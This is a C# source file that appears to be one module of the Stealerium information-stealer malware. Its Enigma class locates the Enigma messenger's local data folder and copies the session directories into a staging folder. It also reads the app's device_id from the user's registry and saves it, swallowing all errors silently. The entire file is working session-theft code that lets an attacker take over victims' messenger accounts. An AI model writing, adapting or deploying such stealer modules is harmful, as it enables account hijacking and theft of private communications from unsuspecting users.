using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.Messengers
{
    internal sealed class Enigma
    {
        private static readonly string EnigmaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Enigma\\Enigma");

        public static void SaveSession(string sSavePath)
        {
            try
            {
                if (!Directory.Exists(EnigmaPath)) return;
                string savePath = Path.Combine(sSavePath, "Enigma");
                Directory.CreateDirectory(savePath);

                foreach (var tempPath in Directory.GetDirectories(EnigmaPath))
                {
                    if (tempPath.Contains("audio") || tempPath.Contains("log") || tempPath.Contains("sticker") || tempPath.Contains("emoji"))
                        continue;

                    string dirName = new DirectoryInfo(tempPath).Name;
                    Filemanager.CopyDirectory(tempPath, Path.Combine(savePath, dirName));
                }

                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Enigma\\Enigma");
                if (key != null)
                {
                    string deviceId = (string)key.GetValue("device_id");
                    File.WriteAllText(Path.Combine(savePath, "device_id.txt"), deviceId, Encoding.UTF8);
                }

                Counter.Enigma = true;
            }
            catch
            {
                // ignored
            }
        }
    }
}